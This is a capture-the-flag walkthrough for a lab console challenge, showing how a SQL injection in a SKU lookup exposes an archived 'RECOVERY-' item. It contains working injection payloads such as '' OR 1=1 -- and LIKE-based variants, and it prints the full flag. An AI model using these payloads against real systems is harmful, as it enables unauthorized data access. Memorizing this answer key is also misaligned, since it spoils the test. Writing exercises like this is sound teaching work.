# Stock Override

Start with:

HELP;

Review the clues:

SHOW SAMPLES;
SHOW NOTES;
SHOW CHECKER;

The outputs establish that:

• CHECK accepts a SKU.
• Historical inventory is excluded from normal searches.
• Internal recovery SKUs begin with RECOVERY-.
• % matches remaining characters in a SQL pattern.
• The supplied SKU is inserted into a quoted SQL lookup.

Confirm normal behavior:

CHECK 'PEN-01';

CHECK 'OLD-01';

The first command returns an active record. The second returns NOT FOUND because OLD-01 is archived.

Confirm that the query logic can be changed:

CHECK '' OR 1=1 -- ';

A broad recovery-pattern test returns the active decoy:

CHECK '' OR (sku LIKE 'RECOVERY-%') -- ';

Expected decoy:

SKU RECOVERY-GUIDE
DESCRIPTION Recovery handling guide

Combine the historical-status clue with the recovery naming convention:

CHECK '' OR (active=0 AND sku LIKE 'RECOVERY-%') -- ';

The response reveals the generated archived recovery SKU:

FOUND
SKU RECOVERY-XXXXXX
DESCRIPTION Internal stock recovery item

Submit the actual returned SKU:

CLAIM 'RECOVERY-XXXXXX';

The console returns the flag as Base64:

RECOVERY ITEM ACCEPTED
ENCODING base64
DATA <BASE64_VALUE>

Decode only the value after DATA. For example:

printf '%s' '<BASE64_VALUE>' | base64 -d

The decoded value is:

flag{inm_active_filters_are_not_access_controls}